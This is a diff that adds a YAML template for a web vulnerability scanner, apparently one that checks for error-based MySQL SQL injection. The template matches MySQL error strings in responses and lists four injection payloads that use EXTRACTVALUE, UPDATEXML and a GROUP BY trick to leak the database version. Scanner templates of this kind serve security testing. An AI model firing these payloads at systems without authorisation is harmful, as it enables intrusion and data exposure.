@@ -1,0 +1,45 @@
+id: "sqli-error-mysql"
+issue_code: "sql_injection"
+detection_condition: "or"
+detection_methods:
+  - response_condition:
+      contains: "You have an error in your SQL syntax"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "mysql_fetch"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "mysqli_"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "MariaDB"
+      part: body
+      confidence: 85
+  - response_check:
+      check: "database_error"
+      confidence: 75
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: mysql
+    - type: platform
+      value: php
+    - type: platform
+      value: wordpress
+    - type: scan_mode
+      value: fuzz
+templates:
+  - "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+  - "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))#"
+  - "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--"
+  - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+categories:
+  - sql_injection
+  - error_based
+  - mysql
+platforms:
+  - mysql
